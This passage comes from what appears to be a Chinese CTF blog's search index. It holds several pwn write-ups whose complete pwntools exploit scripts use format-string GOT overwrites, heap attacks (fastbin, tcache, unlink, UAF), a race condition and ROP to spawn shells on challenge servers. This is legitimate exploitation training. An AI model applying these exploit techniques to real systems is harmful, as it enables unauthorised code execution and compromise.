\n\n脚本中，某些指令有一些技巧，我们必须腾出2字节用于jmp，而某些指令一条就会占用7字节，因此我们换成其他指令，比如mov rsi,0这条指令，我们换成xor rsi,rsi，就有空间来写jmp指令了。\n","categories":["CTF"],"tags":["shellcode","下标越界"]},{"title":"Notebook(修改___stack_chk_fail的GOT表)","url":"/2019/11/21/notebook/","content":"首先，检查一下程序的保护机制，发现PIE和RELRO未开启\n\n\n然后，我们用IDA分析一下,看起来好复杂的样子\n\n\n发现有溢出和格式化字符串漏洞\n\n\n首先当然是想到利用格式化字符串漏洞来泄露canary的值\n\n\n要想执行格式化字符串漏洞，得满足那个if条件\n\n\n我想了好久，才反应过来，如果有传入格式化的字符串，这个条件就不可能满足。但是\n[sprintf不也是一个格式化字符串的吗，这么大的漏洞放这里半天没看见]{.mark}\n怎么利用呢？\n最开始，想的是怎么来泄露canary的值，然而，我们发现，这个程序根本就不能正常的退出，不管输入什么，最终都是异常终止\n\n\n怎么回事，我们只输入了3个字符\n让我们仔细分析一下程序看看\n\n\n这个memset有问题，大小设置为0x3e8，这不把canary、ebp、main函数返回地址等等的都给清零了吗\n\n\n由此想到，这个程序根本不可能正常退出，也不用泄露canary，因为canary一开始就被自己覆盖成0了，最后肯定会[抛出栈异常]{.mark}\n现在有没有想法了？\n也就是说，[这题的栈溢出是我们的干扰项，真正供我们利用的是sprintf格式化字符串漏洞]{.mark}\n抛出栈异常不就是调用___stack_chk_fail函数吗\n\n\n我们是不是可以利用那个sprintf函数，把___stack_chk_fail的got表内容指向main函数，这样，我们又可以重新回到main函数开始的地方，然后再修改另一个函数的got表，让它指向system，因为system有一个参数，所以我们也找一个有参数的函数 \n看看这个printf，很合适啊\n当我们第一次在sub_80486D3函数里利用**[sprintf把___stack_chk_fail的GOT指向了main，把printf的GOT指向了system的PLT,那么，第二次，我们回到了main函数，我们这次输入一个正常的字符串”&#x2F;bin&#x2F;sh”，那么就调用了printf(“&#x2F;bin&#x2F;sh”)，也就是调用了system(“&#x2F;bin&#x2F;sh”)，那么我们就能GET SHELL了。]{.mark}**\n首先，我们得到两个地址\n1.\tmain_addr = 0x804878D  2.\tsystem_plt = 0x8048540  \n\n我们要把main_addr写入到___stack_chk_fail的GOT,把system_plt写入到printf的GOT，并且需要一次性的完成这两个地方的写入，我们**[先一字节一字节写，然后写printf的GOT时，我们2字节2字节的写]{.mark}，并且[根据数据的值从小到大的写入，因为这个一次性写入，输出的字符总数是和前面叠加一起算的]{.mark}，**格式化字符串不理解的可以去网上学习学习\n1.\t#我们需要修改__stack_chk_fail的GOT表为main,printf的GOT表为system的plt  2.\t#先一字节一字节的写main_addr到__stack_chk_fail_got  3.\tpayload = &#x27;a%&#x27; +str(4-1) + &#x27;c%38$hhn%&#x27; + str(8-4) + &#x27;c%39$hhn&#x27;  4.\tpayload += &#x27;%&#x27; + str(0x87-8) + &#x27;c%40$hhn%&#x27; + str(0x8D-0x87) + &#x27;c%41$hhn&#x27;  5.\t#接下来我们两字节两字节修改printf的GOT表  6.\tpayload += &#x27;%&#x27; + str(0x804-0x8D) + &#x27;c%42$hn&#x27;  7.\tpayload += &#x27;%&#x27; + str(0x8540 - 0x804) + &#x27;c%43$hn&#x27;  8.\tpayload += p32(__stack_chk_fail_got+2) + p32(__stack_chk_fail_got+3)  9.\tpayload += p32(__stack_chk_fail_got+1) + p32(__stack_chk_fail_got)  10.\tpayload += p32(printf_got+2) + p32(printf_got)  \n\n这里要说明的是上面**[如何确定地址数据位于的位置,也就是上面%38、%39等这些]{.mark}**，分别对应于p32(__stack_chk_fail_got+2)、p32(__stack_chk_fail_got+3)，但这是如何确定的呢？\n我们可以先把payload里的那些符号都随便替换掉，然后最后加一个’aaaa’,我们就从%38开始试验，用IDA调试\n1.\tpayload = &#x27;aa&#x27; +str(4-1) + &#x27;c%38$phnc&#x27; + str(8-4) + &#x27;cd19ghhn&#x27;  2.\tpayload += &#x27;e&#x27; + str(0x87-8) + &#x27;cf20ghhng&#x27; + str(0x8D-0x87) + &#x27;cg21ghhn&#x27;  3.\tpayload += &#x27;e&#x27; + str(0x804-0x8D) + &#x27;cf42xhn&#x27;  4.\tpayload += &#x27;e&#x27; + str(0x8540 - 0x804) + &#x27;cx43vhn&#x27;  5.\tpayload += &#x27;aaaa&#x27;  \n\n\n\n当我们试到%38$p时，发现格式化后，那里的数据为0x61616161，正好就是末尾的”aaaa”数据，由此，我们就确定了位置。\n综上，我们的exp脚本如下\n1.\t#coding:utf8  2.\tfrom pwn import *  3.\t  4.\tcontext.log_level = &#x27;debug&#x27;  5.\t  6.\tsh = process(&#x27;./pwnh31&#x27;)  7.\t#sh = remote(&#x27;111.198.29.45&#x27;,51813)  8.\telf = ELF(&#x27;./pwnh31&#x27;)  9.\tmain_addr = 0x804878D  10.\t__stack_chk_fail_got = elf.got[&#x27;__stack_chk_fail&#x27;]  11.\tprintf_got = elf.got[&#x27;printf&#x27;]  12.\t#0x8048540  13.\tsystem_plt = 0x8048540  14.\t  15.\t#我们需要修改__stack_chk_fail的GOT表为main,printf的GOT表为system的plt  16.\t#先一字节一字节的写main_addr到__stack_chk_fail_got  17.\tpayload = &#x27;a%&#x27; +str(4-1) + &#x27;c%38$hhn%&#x27; + str(8-4) + &#x27;c%39$hhn&#x27;  18.\tpayload += &#x27;%&#x27; + str(0x87-8) + &#x27;c%40$hhn%&#x27; + str(0x8D-0x87) + &#x27;c%41$hhn&#x27;  19.\t#接下来我们两字节两字节修改printf的GOT表  20.\tpayload += &#x27;%&#x27; + str(0x804-0x8D) + &#x27;c%42$hn&#x27;  21.\tpayload += &#x27;%&#x27; + str(0x8540 - 0x804) + &#x27;c%43$hn&#x27;  22.\tpayload += p32(__stack_chk_fail_got+2) + p32(__stack_chk_fail_got+3)  23.\tpayload += p32(__stack_chk_fail_got+1) + p32(__stack_chk_fail_got)  24.\tpayload += p32(printf_got+2) + p32(printf_got)  25.\t  26.\t&#x27;&#x27;&#x27;&#x27;&#x27;payload = &#x27;aa&#x27; +str(4) + &#x27;c%38$phnc&#x27; + str(8-4) + &#x27;cd19ghhn&#x27; 27.\tpayload += &#x27;e&#x27; + str(0x87-8) + &#x27;cf20ghhng&#x27; + str(0x8D-0x87) + &#x27;cg21ghhn&#x27; 28.\tpayload += &#x27;e&#x27; + str(0x804-0x8D) + &#x27;cf42xhn&#x27; 29.\tpayload += &#x27;e&#x27; + str(0x8540 - 0x804) + &#x27;cx43vhn&#x27; 30.\tpayload += &#x27;aaaa&#x27; 31.\t&#x27;&#x27;&#x27;  32.\tsh.sendline(payload)  33.\t#get shell  34.\tsh.sendline(&#x27;/bin/sh&#x27;)  35.\t  36.\tsh.interactive()\n\n本题难点在于漏洞的查找，有干扰项\n由此，我们还知道了**[绕过canary机制不局限与泄露它，还可以利用格式化字符串漏洞修改___stack_chk_fail的GOT表]{.mark}**\n","categories":["CTF"],"tags":["格式化字符串漏洞","___stack_chk_fail"]},{"title":"nsctf_online_2019_pwn1","url":"/2020/04/17/nsctf_online_2019_pwn1/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\nEdit功能里存在一个null off by one漏洞\n\n\n没有show功能\n\n\n我们可以利用fastbin attack，修改IO_2_1_stdout的_IO_write_base，这样，当再次调用puts或printf的时候，就会泄露出_IO_write_base~_IO_write_ptr之间的数据，更详细的可以查看我的这篇博客https://blog.csdn.net/seaaseesa/article/details/105590591\nfrom pwn import *#context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf1147def add(size,content):   sh.sendlineafter(&#x27;5.exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Input the size:&#x27;,str(size))   sh.sendafter(&#x27;Input the content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;5.exit&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Input the index:&#x27;,str(index))def edit(index,size,content):   sh.sendlineafter(&#x27;5.exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Input the index:&#x27;,str(index))   sh.sendlineafter(&#x27;Input size:&#x27;,str(size))   sh.sendafter(&#x27;Input new content:&#x27;,content)def exploit():   #0   add(0x80,&#x27;a&#x27;)   #1   add(0x68,&#x27;b&#x27;)   #2   add(0xF0,&#x27;c&#x27;)   #3   add(0x10,&#x27;d&#x27;)   delete(0)   #null off by one   edit(1,0x68,&#x27;b&#x27;*0x60 + p64(0x70 + 0x90))   #形成overlap chunk   delete(2)   add(0x80,&#x27;a&#x27;) #0   add(0x68,&#x27;b&#x27;) #2与1重合   add(0xF0,&#x27;c&#x27;) #4   delete(0)   edit(2,0x68,&#x27;b&#x27;*0x60 + p64(0x70 + 0x90))   #重新形成overlap chunk   delete(4)   #chunk1放fastbin   delete(1)   #main_arena指针传递到chunk1的fastbin的fd   add(0x80,&#x27;a&#x27;) #0   #0重新放入unsorted bin合并   delete(0)   #低字节覆盖fd，使得有一定几率指向_IO_2_1_stdout_附近   add(0x80+0x10+2,&#x27;a&#x27;*0x80 + p64(0) + p64(0x71) + p16((2 &lt;&lt; 12) + ((_IO_2_1_stdout_s-0x43) &amp; 0xFFF))) #0   add(0x68,&#x27;b&#x27;) #1   #申请到stdout上方，篡改stdout达到数据泄露   payload = &#x27;\\x00&#x27;*0x33 + p64(0x0FBAD1887) +p64(0)*3 + p8(0x88)   add(0x59,payload) #4   libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   malloc_hook_addr = libc_base + malloc_hook_s   one_gadget_addr = libc_base + one_gadget   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   delete(1)   edit(2,0x8,p64(malloc_hook_addr - 0x23))   add(0x68,&#x27;b&#x27;) #1   #申请到malloc_hook-0x23处   add(0x60,&#x27;\\x00&#x27;*0x13 + p64(one_gadget_addr)) #5   #getshell   sh.sendlineafter(&#x27;5.exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Input the size:&#x27;,&#x27;1&#x27;)while True:   try:      global sh      #sh = process(&#x27;./nsctf_online_2019_pwn1&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,26396)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["fastbin","off by one","IO FILE"]},{"title":"oneman_army(tcache里几个小chunk伪造成大chunk申请出来)","url":"/2020/02/07/oneman_army/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，9011功能可以溢出\n\n\n最大申请0x1FF大小的堆，申请次数没有限制\n\n\nDelete功能没有把指针清空\n\n\n本题，已知libc为2.27，所以存在tcache bin机制，可以很容易利用。我们肯定是要攻击free_hook或者malloc_hook,那么首先需要泄露地址，而泄露地址，需要利用unsorted bin，溢出，我们就**[利用溢出，修改下一个chunk的size，使得大小为large bin范围，然后把它申请回来后再delete，就可以放入unsorted bin]{.mark}**\nfor i in range(1, 0x10):     create(0x10*i, &#x27;AAA&#x27;)     delete()  #把chunk0申请回来  create(0x10,&#x27;A&#x27;)  #溢出，修改下一个chunk的size，使得其大小为large bin范围  payload = &#x27;A&#x27;*0x10  payload += p64(0) + p64(0x4b1)  edit256byte(payload)  delete()  #将chunk1申请回来  create(0x20,&#x27;B&#x27;)  #现在chunk1的size为0x4d1,我们delete它，就可以放入unsorted bin  delete()  \n\n接下来，我们就可以从unsorted bin里切割0x30大小空间，那么libc指针被传到向后偏移0x30处的chunk\n#将libc指针传递到chunk2  create(0x20,&#x27;B&#x27;) #chunk1  \n\n我们来看看，unsorted bin的头和tcache bin的头重合了\n\n\n现在，我们只需把0x40的chunk申请回来，里面就有指针信息，我们只需泄露即可\ncreate(0x30,&#x27;C&#x27;) #chunk2  show()  sh.recv(1)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  free_hook_addr = libc_base + free_hook_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  \n\n接下来就是溢出chunk2，覆盖chunk3的tcache_next指针为free_hook的地址，即可申请到free_hook的地址\n综上，我们完整的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./oneman_army&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,59787)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]  system_s = libc.symbols[&#x27;system&#x27;]    def create(size,content):     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size:&#x27;,str(size))     sh.sendafter(&#x27;Content:&#x27;,content)    def show():     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)    def delete():     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)    #能够写256字节  def edit256byte(content):     sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;9011&#x27;)     sh.send(content)    for i in range(1, 0x10):     create(0x10*i, &#x27;AAA&#x27;)     delete()  #把chunk0申请回来  create(0x10,&#x27;A&#x27;)  #溢出，修改下一个chunk的size，使得其大小为large bin范围  payload = &#x27;A&#x27;*0x10  payload += p64(0) + p64(0x4b1)  edit256byte(payload)  delete()  #将chunk1申请回来  create(0x20,&#x27;B&#x27;)  #现在chunk1的size为0x4d1,我们delete它，就可以放入unsorted bin  delete()  #将libc指针传递到chunk2  create(0x20,&#x27;B&#x27;) #chunk1  create(0x30,&#x27;C&#x27;) #chunk2  show()  sh.recv(1)  main_arena_xx = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  free_hook_addr = libc_base + free_hook_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  #修改0x40的chunk的tcache_next指针，指向free_hook  payload = &#x27;C&#x27;*0x30  payload += p64(0) + p64(0x50)  payload += p64(free_hook_addr)  edit256byte(payload)    create(0x40,&#x27;D&#x27;*0x40) #chunk3  #chunk4分配到free_hook处  create(0x40,p64(system_addr))  #chunk5  create(0x50,&#x27;/bin/sh\\x00&#x27;)  #getshell system(&quot;/bin/sh&quot;)  delete()    sh.interactive()  \n\n本题，我们可以看出，tcache缺少足够的检查，使得我们可以伪造一个large bin，而fastbin则不能这样利用,fastbin可以利用malloc large bin来将fastbin合成，而tcache bin，我们可以自己手动合并，伪造大的chunk\n","categories":["CTF"],"tags":["tcache","unsorted bin","glibc 2.27","large bin"]},{"title":"Play(条件竞争,多进程共享同一数据区域)","url":"/2019/12/19/play/","content":"首先，检查一下程序的保护机制，很好\n\n\n然后，我们用IDA分析，发现一个很明显的栈溢出漏洞\n\n\n但是，要想执行这个漏洞函数，就必须打赢游戏\n\n\n而，要打赢游戏，就是让*(_DWORD *)(gMonster + 8)的值小于等于0，也就是Host的Surplus要小于等于0\n\n\n然后，我们看到这里有一个修改(gMonster + 8)值的地方\n\n\n也就是Host和Hero互相攻击，消减对方的生命值，我们继续分析，发现gHero指向的是一个内存映射出来的区域\n\n\n那么，假如我们同时运行两个该程序的进程，并且**[登录同一个用户名，那么，它们的gHero是同一个内存区域，那么，gHero就叠加了两种技能]{.mark}**，于是就可以打败BOSS。执行漏洞函数，getshell\n我们可以这样\n1.\tchange_skill(io1, 3)  2.\tattack(io1)  3.\tchange_skill(io2,1)  4.\tuse_hide(io1, 1)  \n\n如上代码,io1使用技能3,会导致双方的生命值都增加，当我们使用技能3 attack时，[当出现use hiden_methods?(1:yes&#x2F;0:no)选择时，我们通过io2来改变gHero的技能，使得执行后面的代码时，gHero的生命值增加，gMonster的生命值递减]{.mark}，这样，我们就能赢得游戏\n\n\n也就是说,在read_int()阻塞io1时，我们通过io2改变了gHero的相关属性，使得后面的代码取得的gHero数据和之前不一致。\n程序使用了类似于虚表的东西来实现不同技能，从不同的地方取数据，感兴趣的同学可以仔细跟踪一下几个技能，分别对应的数据在哪，然后找到让gHero技能递增,gMonster递减的攻击模式。我们上述的是一种攻击方法，可能还会有其他攻击方法。\n\n\n打赢了游戏，就是一个简单的栈溢出漏洞，直接利用即可。\n综上，我们的exp脚本\n1.\t#coding:utf8  2.\tfrom pwn import *  3.\tfrom LibcSearcher import *  4.\t  5.\tdebug = 1  6.\t  7.\tif debug:  8.\t   io1 = process(&#x27;./pwnh38&#x27;)  9.\t   io2 = process(&#x27;./pwnh38&#x27;)  10.\telse:  11.\t   addr = &#x27;111.198.29.45&#x27;  12.\t   port = 59829  13.\t   io1 = remote(addr,port)  14.\t   io2 = remote(addr,port)  15.\t  16.\telf = ELF(&#x27;./pwnh38&#x27;)  17.\tputs_plt = elf.plt[&#x27;puts&#x27;]  18.\tputs_got = elf.got[&#x27;puts&#x27;]  19.\tvul_func = elf.sym[&#x27;vul_func&#x27;]  20.\t  21.\tdef login(io, name):  22.\t   io.sendlineafter(&quot;login:&quot;, name)  23.\t  24.\tdef attack(io):  25.\t   io.sendlineafter(&quot;choice&gt;&gt; &quot;,&quot;1&quot;)  26.\t  27.\tdef use_hide(io, choice):  28.\t   io.sendlineafter(&quot;(1:yes/0:no):&quot;,str(choice))  29.\t  30.\tdef change_skill(io, choice):  31.\t   io.sendlineafter(&quot;choice&gt;&gt; &quot;,&quot;3&quot;)  32.\t   io.sendlineafter(&quot;choice&gt;&gt; &quot;, str(choice))  33.\t  34.\tdef god_attack(io1, io2):  35.\t   change_skill(io1, 3)  36.\t   attack(io1)  37.\t   change_skill(io2,1)  38.\t   use_hide(io1, 1)  39.\tdef pwn(io1, io2):  40.\t    login(io1, &quot;test\\n&quot;)  41.\t    login(io2, &quot;test\\n&quot;)  42.\t    while True:  43.\t        god_attack(io1, io2)  44.\t        data = io1.recvuntil(&quot;\\n&quot;)  45.\t        if &quot;you win&quot; in data:  46.\t            data = io1.recvuntil(&quot;\\n&quot;)  47.\t            if &quot;remember you forever!&quot; in data:  48.\t                break  49.\t    #泄露puts的地址  50.\t    payload = &#x27;a&#x27;*0x4C + p32(puts_plt) + p32(vul_func) + p32(puts_got)  51.\t    io1.sendlineafter(&#x27;name:&#x27;,payload)  52.\t    io1.recvuntil(&#x27;\\n&#x27;)  53.\t    puts_addr = u32(io1.recv(4))  54.\t    #查询数据库，得到libc的信息  55.\t    libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)  56.\t    #获得libc基址  57.\t    libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  58.\t    system_addr = libc_base + libc.dump(&#x27;system&#x27;)  59.\t    binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  60.\t    #getshell  61.\t    payload = &#x27;a&#x27;*0x4C + p32(system_addr) + p32(0) + p32(binsh_addr)  62.\t    io1.sendlineafter(&#x27;name:&#x27;,payload)  63.\t  64.\tpwn(io1, io2)  65.\tio1.interactive()  66.\t#io2.interactive()  \n\n本题告诉我们，[对于程序中使用文件时，应该加类似于锁的东西，使得当前程序获得文件的所有权后，其他的不能在那个程序运行期间获得文件的所有权。]{.mark}\n","categories":["CTF"],"tags":["栈溢出","ROP","条件竞争"]},{"title":"pwn11","url":"/2020/02/09/pwn11/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n程序会把字**[符串里的I替换成you，导致strcpy后，s出现栈溢出]{.mark}**，直接覆盖到后门函数地址即可\n\n\n后门函数\n\n\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./pwn11&#x27;)    sh = remote(&#x27;111.198.29.45&#x27;,31584)  payload = &#x27;I&#x27;*21 + &#x27;A&#x27; + p32(0x8048F0D)  sh.sendline(payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出"]},{"title":"pwnable_applestore(unlink+局部变量生命周期外引用的漏洞)","url":"/2020/06/11/pwnable_applestore/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在checkout函数中，如果v1&#x3D;7174，则把这个函数里的临时节点链接到了链表当中，这就存在了局部变量外部引用的漏洞，通过其他函数，我们可以控制v2节点的内容，进而可以泄露信息等。\n\n\n控制其name指针指向got表，然后调用cart函数即可泄露地址\n\n\n通过伪造其next和prev指针，在delete里，没有free操作，只是一个双向链表的解链操作，在这里可以unlink攻击\n\n\n假如v4设置为system函数地址,v5设置为atoi函数的got表，这会崩溃，因为在执行v4-&gt;prev时，将会往system代码处写数据，而那处是不可写的。我们可以将v4设置为atoi_got+0x22，然后将v5设置为ebp_addr-0x8，这样，unlink后，栈里ebp的位置被写入atoi_got+0x22，当程序退出该函数时，来到handler函数，而此时ebp就是atoi_got+0x22，ebp-0x22就是atoi_got的位置，这样，通过read(&amp;nptr,0x15)这里就可以改写atoi的got表为system，然后getshell。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./applestore&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25466)elf = ELF(&#x27;./applestore&#x27;)atoi_got = elf.got[&#x27;atoi&#x27;]libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(type):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Device Number&gt;&#x27;,str(type))def delete(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Item Number&gt;&#x27;,str(index))def cart(payload):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendafter(&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;,payload)def checkout():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)   sh.sendafter(&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;,&#x27;y&#x27;)for i in range(6):   add(1)for i in range(20):   add(2)#将一个栈地址链接到链表上，并且next和prev指针未初始化checkout()cart(&#x27;y\\x00&#x27; + p32(atoi_got) + p32(0) * 3)sh.recvuntil(&#x27;27: &#x27;)atoi_addr = u32(sh.recv(4))libc_base = atoi_addr - libc.sym[&#x27;atoi&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()environ_addr = libc_base + libc.sym[&#x27;environ&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)print &#x27;environ_addr=&#x27;,hex(environ_addr)#泄露栈地址cart(&#x27;y\\x00&#x27; + p32(environ_addr) + p32(0) * 3)sh.recvuntil(&#x27;27: &#x27;)stack_addr = u32(sh.recv(4))print &#x27;stack_addr=&#x27;,hex(stack_addr)ebp_addr = stack_addr - 0x104#伪造一个假item，修改ebp为atoi_got+0x22fake_item = p32(0)*2 + p32(atoi_got + 0x22) + p32(ebp_addr - 0x8)#unlinkdelete(&#x27;27&#x27;+fake_item)#修改atoi的got表，同时getshellsh.sendlineafter(&#x27;&gt;&#x27;,p32(system_addr) + &#x27;;/bin/sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["unlink","UAF","局部变量引用"]},{"title":"pwnable_dragon","url":"/2020/06/11/pwnable_dragon/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，游戏结束后释放掉了ptr\n\n\n也就是释放掉了v5，而当我们打赢游戏的时候，又malloc(0x10)并输入，然后又调用了v5里面的函数指针，由于v5之前free掉了，所以这里malloc(0x10)并输入，控制的就是v5指向的那块内存，将里面指针指向后面函数即可。\n\n\n现在是如何才能赢得游戏，观察龙的血量，是一个byte\n\n\n而赢得游戏的条件是龙的血量小于等于0\n\n\nByte的话超过127，就小于等于0了，因此，我们让龙的血量不断增加，最终溢出即可赢得游戏。第一次，我们故意输掉游戏，然后来到第二次,龙的血量初始化为80，也就是0x50，这样我们只需让龙的血量增加0x30即可轻松赢得游戏。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./pwnable_dragon&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29862)def win():   #第一次输掉   sh.sendlineafter(&#x27;[ 2 ] Knight&#x27;,&#x27;1&#x27;)   for i in range(2):      sh.sendline(&#x27;3&#x27;)      sh.sendline(&#x27;3&#x27;)      sh.sendline(&#x27;2&#x27;)   #第二次，dragon的血为80，我们让其增加溢出127后即可赢   sh.sendlineafter(&#x27;[ 2 ] Knight&#x27;,&#x27;1&#x27;)   for i in range(4):      sh.sendline(&#x27;3&#x27;)      sh.sendline(&#x27;3&#x27;)      sh.sendline(&#x27;2&#x27;)win()sh.sendlineafter(&#x27;The World Will Remember You As:&#x27;,p32(0x08048DBF))sh.interactive()","categories":["CTF"],"tags":["UAF","整数溢出"]},{"title":"攻防世界-pwnh2","url":"/2019/10/26/pwnh2/","content":"\n首先用IDA分析，可以看出这里有一个栈溢出漏洞\n\n结尾处有一个函数调用，于是我们在这里断点\n\n然后我们随便输入测试内容\n\n发现计算后，会把0Xffffd674里的内容赋值给eax，然后call eax，那么我们可以用栈溢出来修改0Xffffd674里的内容为后门函数的地址通过IDA，我们知道v2的地址为0xFFFFD650，那么0Xffffd674-0xFFFFD650&#x3D;0x24，后门函数地址为0x80486CC，于是payload为payload &#x3D; ‘a’*0x24 + p32(0x80486CC)\n综上，我们的脚本为\nfrom pwn import *  #sh = process(&#x27;./pwnh2&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,47364)  sh.recvuntil(&#x27;&gt;&#x27;)  sh.sendline(&#x27;test&#x27;)  sh.recvuntil(&#x27;&gt;&#x27;)  payload = &#x27;a&#x27;*0x24 + p32(0x80486CC)    sh.sendline(payload)  sh.interactive()","categories":["CTF"],"tags":["栈溢出"]},{"title":"攻防世界-pwnh5","url":"/2019/10/27/pwnh5/","content":"我们知道 x86都是靠栈来传递参数的 而x64换了 它顺序是rdi, rsi, rdx, rcx, r8, r9, 如果多于6个参数 才会用栈 我们要先知道这个特性\n这题，里面既没有现成的system也没有&#x2F;bin&#x2F;sh字符串，也没有提供libc.so给我们，那么我们要做的就是想办法泄露libc地址，拿到system函数和&#x2F;bin&#x2F;sh字符串,这题呢，我们可以利用put来泄露read函数的地址，然后再利用LibcSearcher查询可能的libc。\n这题ROP，我们先构造payload来执行puts函数泄露read的地址popedi是pop edi这条指令所在的地址，我们可以在二进制文件里查找，发现了地址0x400763处可以供我们使用,然后我们传入read的got地址,接下来是popedi的返回地址，我们设为putaddr，接下来是puts的返回地址，我们设为mainaddr，这样我们又能重新执行主函数，执行第二次rop以下payload相当于\npush read_addr pop edi call puts call main\n\npayload = &#x27;a&#x27;*0x48 + p64(popedi) + p64(readgot) + p64(putaddr) + p64(mainaddr) + &#x27;a&#x27;*(0xC8-0x48-32)\n\n这样，我们就泄露出了read的地址，然后我们利用libcSearcher搜索匹配到的可能的libc版本，从而获得system的地址和&#x2F;bin&#x2F;sh的地址\n#libc数据库查询 obj = LibcSearcher(&quot;read&quot;,addr) #得到libc加载地址 libc_base = addr - obj.dump(&#x27;read&#x27;) #获得system地址 system_addr = obj.dump(&quot;system&quot;) + libc_base  #获得/bin/sh地址 binsh_addr = obj.dump(&quot;str_bin_sh&quot;) + libc_base\n\n然后我们构造payloadpayload &#x3D; ‘a’0x48 + p64(popedi) + p64(binsh_addr) + p64(system_addr) + ‘a’(0xC8-0x48-24)相当于\npush binsh_addr pop edi call system \n\n我们最终的脚本为\n#coding:utf8 from pwn import * from LibcSearcher import *  elf = ELF(&#x27;./pwnh5&#x27;) #x86都是靠栈来传递参数的 而x64换了 它顺序是rdi, rsi, rdx, rcx, r8, r9, 如果多于6个参数 才会用栈 readgot = elf.got[&#x27;read&#x27;] putaddr = elf.sym[&#x27;puts&#x27;] mainaddr = 0x4006B8 #pop edi的地址 popedi = 0x400763  #sh = process(&#x27;./pwnh5&#x27;) sh = remote(&#x27;111.198.29.45&#x27;,52630)  #这个payload用于泄露read位于libc的地址 #pop edi将read的地址加载到edi中，用于传给put输出显示 #mainaddr为覆盖eip，这样我们又可以重新执行main函数了 payload = &#x27;a&#x27;*0x48 + p64(popedi) + p64(readgot) + p64(putaddr) + p64(mainaddr) + &#x27;a&#x27;*(0xC8-0x48-32)  sh.send(payload)  sh.recvuntil(&#x27;bye~\\n&#x27;)   #注意，这步重要,必须要去掉末尾的\\n符号 s = sh.recv().split(&#x27;\\n&#x27;)[0] #凑足长度8 for i in range(len(s),8):   s = s + &#x27;\\x00&#x27;  #得到read的地址 addr = u64(s)  print hex(addr)  #libc数据库查询 obj = LibcSearcher(&quot;read&quot;,addr)  #得到libc加载地址 libc_base = addr - obj.dump(&#x27;read&#x27;)  #获得system地址 system_addr = obj.dump(&quot;system&quot;) + libc_base  #获得/bin/sh地址 binsh_addr = obj.dump(&quot;str_bin_sh&quot;) + libc_base   print hex(system_addr) print hex(binsh_addr)  payload = &#x27;a&#x27;*0x48 + 